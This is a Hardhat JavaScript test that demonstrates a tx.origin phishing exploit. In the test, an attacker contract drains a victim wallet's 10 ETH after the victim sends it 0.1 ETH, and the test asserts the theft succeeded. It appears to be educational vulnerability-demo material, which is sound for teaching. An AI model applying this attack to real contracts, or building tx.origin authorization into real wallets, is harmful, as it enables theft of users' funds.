const { time,loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");

describe("Using tx.origin for checking valid address", function () {

	it("Empty the balance of the victim contract", async function () {

		// Get two addresses, treat one as victim user and one as attacker
		const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

		// Deploy the victim contract
		const TxoriginUserWalletFactory = await ethers.getContractFactory("TxoriginUserWallet", innocentAddress);
		const txoriginUserWallet = await TxoriginUserWalletFactory.deploy();
		await txoriginUserWallet.deployed();

		//Deploy the attacker contract
		const TxoriginAttackWalletFactory = await ethers.getContractFactory("TxoriginAttackWallet", attackerAddress);
		const txoriginAttackWallet = await TxoriginAttackWalletFactory.deploy(txoriginUserWallet.address);
		await txoriginAttackWallet.deployed();

		// Victim User deposits 10 ETH
		let tx = await innocentAddress.sendTransaction({
			from: innocentAddress.address,
			to: txoriginUserWallet.address,
			value: parseEther("10")
		});
		const receipt = await tx.wait();
		//console.log(receipt);

		let initialBalanceETH = await ethers.provider.getBalance(attackerAddress.address);
		let initialBalanceETHValue = ethers.BigNumber.from(initialBalanceETH);

		// Attacker tricks Victim User to send some ETH to this malicious contract
		// Victim user has to be wallet who deploy Victim smart contract
		let tx2 = await innocentAddress.sendTransaction({
			from: innocentAddress.address,
			to: txoriginAttackWallet.address,
			value: parseEther("0.1")
		});
		const receipt2 = await tx2.wait();
		//console.log(receipt2);

		let finalBalanceETH = await ethers.provider.getBalance(attackerAddress.address);
		let finalBalanceETHValue = ethers.BigNumber.from(finalBalanceETH);

		let balanceDiff = finalBalanceETHValue.sub(initialBalanceETHValue);
		expect(balanceDiff).to.equal(parseEther("10"));
	});

});